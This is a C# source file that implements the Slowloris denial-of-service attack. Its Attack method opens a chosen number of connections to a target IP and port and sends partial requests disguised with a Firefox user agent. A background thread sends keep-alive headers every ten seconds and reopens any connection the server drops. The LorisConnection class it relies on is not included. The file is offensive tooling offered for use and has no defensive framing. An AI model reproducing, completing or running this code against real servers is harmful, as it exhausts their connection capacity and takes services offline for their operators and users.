using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SlowLoris
{
    public class Loris
    {
        private List<LorisConnection> connections;

        public Loris()
        {
            connections = new List<LorisConnection>();
            new Thread(() => keepAliveThread()).Start();
        }

        public void Attack(string ip, int port, bool useSsl, int count)
        {
            Console.WriteLine("Initializing connections for {0} sockets.", count);
            for (int i = 0; i < count; i++)
            {
                var conn = new LorisConnection(ip, port, useSsl);
                conn.SendHeaders("Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0");
                connections.Add(conn);
            }
        }

        private void keepAliveThread()
        {
            while (true)
            {
                Console.WriteLine("Sending keep alive headers for {0} connections.", connections.Count);
                for (int i = 0; i < connections.Count; i++)
                {
                    try
                    {
                        connections[i].KeepAlive();
                    }
                    catch
                    {
                        // If we get shut down, open a new connection with an identical config.
                        connections[i] = new LorisConnection(connections[i].IP, connections[i].Port, connections[i].UsingSsl);
                    }
                }
                Thread.Sleep(10000);
            }
        }
    }
}

